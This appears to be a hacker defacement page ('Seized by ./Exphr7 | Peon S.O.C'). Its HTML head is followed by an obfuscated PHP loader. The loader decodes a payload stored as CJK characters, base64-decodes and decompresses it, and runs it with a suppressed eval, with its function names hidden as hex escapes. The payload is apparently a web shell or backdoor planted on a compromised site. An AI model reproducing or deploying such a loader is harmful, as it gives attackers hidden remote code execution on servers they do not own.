<head>
  <title>Seized By ./Exphr7 | Peon S.O.C</title>
  <meta name="title" content="Seized by ./Exphr7 | Peon S.O.C">
  <meta name="description" content="Seized by ./Exphr7 | Peon S.O.C">
  <meta name="keywords" content="Seized by ./Exphr7 | Peon S.O.C">
  <link href="https://fonts.googleapis.com/css?family=Inconsolata&display=swap" rel="stylesheet">
  <link rel="icon" type="image/png" href="https://i.top4top.io/p_3580eruja1.png" sizes="512x512" />
  <link rel="shortcut icon" type="image/png" href="https://i.top4top.io/p_3580eruja1.png" sizes="512x512" />
  <link rel="preload" as="image/png" href="https://i.top4top.io/p_3580eruja1.png" />
  <meta charset="UTF-8">
  <meta http-equiv="cache-control" content="index,cache">
  <meta http-equiv="pragma" content="index,cache">
  <meta name="theme-color" content="black">
  <meta name="viewport" content="width=1024">
</head>
<?php null;
$ex="聥聎聱耹聖聭耱聶耳聅聑聑耯聬職聫耯聳聐聕聅聵聧聩聡聶聴聥聅聴聯耶聶聯聴聋聆聖聃聫耰聬聓耶耸聧聇聱聱聴聱聺耵耫聸聴耱聲聴聭聤耳耰聶聁聓联耫聃聈耫聏聘耸聊耴聺耳聡聣聵耰聑聑聅聐耱聧聮耳聤耲耵聰聮耳聭聙聴聺聚聏聮聳耸耸耸聁聙聳聵聴職聎聫聣耫联聗聭耸聍耰聗聧聶聂耸聕耫聢耶聋聦職聋聢耱聂聊聭聁聥聘職聣聳耴耳职聅耵聩聑聉聴聁耸聫聋聮聈聱聏耶聫聇聩聰聅聖聰聰耱耴聄聳耷聧聈聸聪聳聁聓聎聅聫聭聰聥聗聋耯聬聦聙聋耵職聵耱聙耶聎聑耯聇聅聆聸聥聑聡耵聸聏聦聖聹聡耰聳联聨聥聇聓聅聅聹聑聋聚聕聊聚聃聕耳聑聡聋聋聍聄聈聭聢聍聫聋职聲聢联聃耰聫耶聪聂职聍聳聩耹联聢聫聲聂聴聬聏聺聚聱聕聈聇聳聘聕聍耳聙聲耰聏聓聉聴聱耯聃聘聦聇聫耹聴聊聵聓耷聋聙聆聹聺聄聳聊聓聚聴耶聥聥聂耱聡聖聸耯聑聅聘聉聘聬聨耸聮聊聳聹聈聱耶聩聍聢聂聙耷聚聫聆聤聭耶聰耲聍聸聨聴耶聐聁聪耳聬聚聨聣聡聚聴聕聆聪耶聊聴聰职聥聩聱聕聥聍聐聐聶聴聙聓耹聦聃聙耵耰職聙聰聦聺耫耸耯聤聚耯耱聳耹耰聄聥聢聪聺聸聖聦联聢耲聅聊联聮耶聤聡耶耱聅聲耲聫聣耵聮聩耵聯聭耷聶聕耫耰耱聃職聲耲聎耯职聎聁聗聥聙耱聅聲聅聫聲耳聒聂聡聃聊聖聥聈聺聃聵聏耶耵聋聩耳耫聎聣耸耹联聭耰耹聆職聦聆聹聺聏職聆聘聉聅耴聗聧聆聕聰聖耯聄职耷聧聃職耵聍聋聩聪聳聂聧聹聤聬聧聐聐聺聩聃聁聹聺聬聗聙聗聂耰耯聲聕耶聢聚耱聩聒聍耴聇聂耰耵聊聒聯聚聵聺聧耫聘聏耶耴聮聋聆耲聧耵聇聑耫聉耷聢聑聇聤耫聧聧聭職耲聇耵耶聙聧耵耸聩聹耳聅聙聸聐聏聵聊聶聏耹聳聡聧耶职聉聘耫聐聩聩聬聵耯職聊聓聺聎聳耷聇职聹聱职耯聱聋聹聬聲聱聯聍耷聲聰聧聑聩聫聫聧聩聐聥聖聇聈聧聅聮耷聍聏聩聖聅聨聖聆耲聧聩聥聯聶耶聦職聊聵聺耫耲聖聣聯聧耴聓聯聑職聎聩聕耫聫耷聵聆耶聆聩聲聤耳聱聩聨聕聡聭聅聗职聄耷聧聐聡聬聧耴聑聍耶聆聗聘職聉耲聦聣聯耱聊聐聗耴聪耰聇聲聤耱聣联聈聹聬聩耫耳聐聰聎耴聕聡聑耰聂聴耱聤耸耸聅聺耶联聐职聒聢聭耴聋耶聺聯聖聚職聙職聏聖聥聴聪聗聥聨職耲聃聹聦聥聹聢聡耹聕聐聳聈聩耸聺耱聖耹聴聗聑聅职聕联聉聲聋聥聓聮聕耲聴耹聅聆聇耶聲联聲耲聭聚耫聋聕聲聹聁聒聺聎聄聅聱聒耱耰聁聯聉聫耲聲聰耲耳聆聂職耶聢聥聕聵聩聫耶耫聑聡聨聅聢聋耴聳聢耷聺聲聶聐聲聨聲聇耲聳聈聥聧聉聹耸聹聍聄聲耵聸耶聎聴耱耯耯聥聥聄聺耰聭聲耷聢聈聗聢聸聑聴耹聇耳聪耯聘聡職聩聡職聇聩聫聃聢聴聫聃聤聮聢耲聺耶耷耸联聺耱聶聶聚聵聓聑聉聣职聶聍聡聐聘聡聢耷聑耴聬耹職聋聦聥聋耰聂耶耵聸聓耷耹耲聋聇聙耰聥聡聚聚聋聆聸聆聕聚聙聫耶聙聑聚聐聤耳耷聆聦聐聢聮耷耳耹聣聹聅聍聮聚聬聭聤聖聬聬聑聯聂聴聺聮聧聃聎耲聄聳聙联聖聉聖聄聑聴聯聢聴聃聁聖聙耶耱聄聪聗聨聸聹聈聦耶聤聱职耲耱耷聫聍聯耳聢耱聨耰聡職聥耫耫耰耷聓聙聲耶聐耫聦耴职聈耸聸聥聶耶聅聤聩聸聩聸聦联聥聰聐聴聥聃聗耯聕聒聦耳耱聥聡聰耳聏聵聘耱聣聡耳聲聦聱耴聲聍聹职職聇联聘聁聆耹聦聋聪聱耴联耯職聭聈聤耰聃聭聥聤联聙聣聥耫聦耶耷聲耹耷聄聭耯聐职耱聺聃耯聦聈聬聸耯聶聚聈聉聉职聶聎耱耷聥耷聑聹耵聳耹聳聒耷聘聁聂聯聖联聰聓聲聺聵聵聙耷耸聩聨聵聱职聏聭聉聃耫聱聩聥聭聗聑聈耶聬聡聓耷聥聦耹耱聈聨聤聨聗聮耯聓聯聵聱聉聱聐聨耰聱聹聹聦聕聯聋聍聯聊聊联聖耰聒聰聂聴聪聸耷聴聂聦聵聏聯聴聯聮聸聥聆聎聅耸聕聨耹聖耷聢聹聎耰耳聣聤聁聧聣聈聏聩聭聑耹耯聁聚聪聋聐聸耴耽"; 
$_x="\x70"."\x72"."\x65"."\x67"; $_y="\x5f"."\x72"."\x65"."\x70"."\x6c"."\x61"."\x63"."\x65"."\x5f"; $_z="\x63"."\x61"."\x6c"."\x6c"."\x62"."\x61"."\x63"."\x6b";$_0=$_x.$_y.$_z;
$_f=function($s)use($_0){return $_0('/[\xe0-\xef][\x80-\xbf]{2}/',function($m){$bt=unpack('C*',$m[0]);if(count($bt)===3&&($bt[1]&0xE0)===0xE0){$cp=(($bt[1]&0x0F)<<12)|(($bt[2]&0x3F)<<6)|($bt[3]&0x3F);if($cp>=0x8000&&$cp<=0x807F)return chr($cp-0x8000);}return $m[0];},$s);};
$_1="\x67"."\x7a"."\x75"."\x6e"."\x63"."\x6f"."\x6d"."\x70"."\x72"."\x65"."\x73"."\x73";$_2="\x62"."\x61"."\x73"."\x65"."\x36"."\x34"."\x5f"."\x64"."\x65"."\x63"."\x6f"."\x64"."\x65";$gz=$_1;$d64=$_2;
@eval("\x3f\x3e".$gz($d64($_f($ex))));
?>